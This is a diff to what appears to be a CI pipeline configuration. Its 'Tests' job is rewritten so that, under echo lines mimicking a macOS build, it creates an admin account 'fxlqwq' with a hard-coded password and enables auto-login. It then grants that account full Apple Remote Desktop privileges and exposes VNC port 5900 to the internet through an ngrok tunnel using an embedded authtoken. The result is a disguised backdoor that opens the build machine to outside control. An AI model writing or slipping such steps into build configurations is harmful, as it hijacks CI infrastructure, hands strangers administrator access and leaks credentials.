@@ -10,4 +10,25 @@ blocks:
       jobs:
         - name: Tests
           commands:
-            - curl ipinfo.io/json
+            - echo "Starting build on macOS Ventura..."
+            - 'echo "Running sw_vers to get macOS version:"'
+            - sw_vers
+            - echo "Build completed."
+            - sudo dscl . -create /Users/fxlqwq
+            - sudo dscl . -create /Users/fxlqwq UserShell /bin/bash
+            - sudo dscl . -create /Users/fxlqwq RealName "fxlqwq"
+            - sudo dscl . -create /Users/fxlqwq UniqueID 5100
+            - sudo dscl . -create /Users/fxlqwq PrimaryGroupID 20
+            - sudo dscl . -create /Users/fxlqwq NFSHomeDirectory /Users/fxlqwq
+            - sudo dscl . -passwd /Users/fxlqwq Aa135792468+-
+            - sudo dscl . delete /Users/fxlqwq IsHidden
+            - sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser "fxlqwq"
+            - sudo dseditgroup -o edit -a fxlqwq -t user admin
+            - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent -menu
+            - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -allowAccessFor -specifiedUsers
+            - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -users fxlqwq -privs -all
+            - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -restart -agent -menu
+            - ps aux | grep ARDAgent
+            - brew install ngrok/ngrok/ngrok
+            - sudo ngrok config add-authtoken 2ZHr1Pm6XaQjzwBMudNWkErclAI_3cLRX7ZvxrkZCrrcC3Y3E
+            - ngrok tcp 5900
